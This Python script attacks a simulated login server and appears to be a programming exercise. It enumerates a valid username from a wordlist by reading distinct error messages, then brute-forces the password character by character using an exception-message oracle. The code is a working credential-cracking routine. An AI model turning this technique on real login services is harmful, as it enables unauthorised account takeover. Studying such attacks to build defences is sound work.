import json
import string
from server_side import Server


class PasswordCracking:
    def __init__(self):
        self.login: str = ""
        self.password: str = ""

    def crack_login(self, server: Server) -> None:
        """
            Login cracking password
            server: Server - server object
            return: None
        """

        with open("logins.txt", 'r', encoding='utf-8-sig') as file:
            lines = file.readlines()

        for login in lines:
            request = {"login": login.strip(), "password": self.password}
            request_json = json.dumps(request)
            response = server.send_request(request_json)
            response_data = response["result"]

            if response_data == "Wrong password!":
                self.login = login.strip()
                print(f"Login is {self.login}")
                return

    def crack_password(self, server: Server) -> None:
        """
            Password cracing process
            server: Server - server object
            return: None
        """

        symbols = string.ascii_letters + string.digits
        tmp_password = ''
        while True:
            for symbol in symbols:
                self.password = tmp_password + symbol
                request = json.dumps({'login': self.login, 'password': self.password})
                response = server.send_request(request)
                result = response['result']
                if result == 'Wrong login!':
                    raise Exception('Wrong login!')
                elif result == 'Exception happened during login':
                    tmp_password += symbol
                    print('Password:', self.password)
                    break
                elif result == 'Wrong password!':
                    continue
                elif result == 'Connection success!':
                    print('Password:', self.password)
                    return
                elif result == 'Bad request':
                    raise Exception('Bad request')


if __name__ == "__main__":
    server = Server()
    print(f"Login is {server.get_login()}, Password is {server.get_password()}")
    print(f"Start cracking!")
    passwordCracking = PasswordCracking()
    passwordCracking.crack_login(server)
    passwordCracking.crack_password(server)
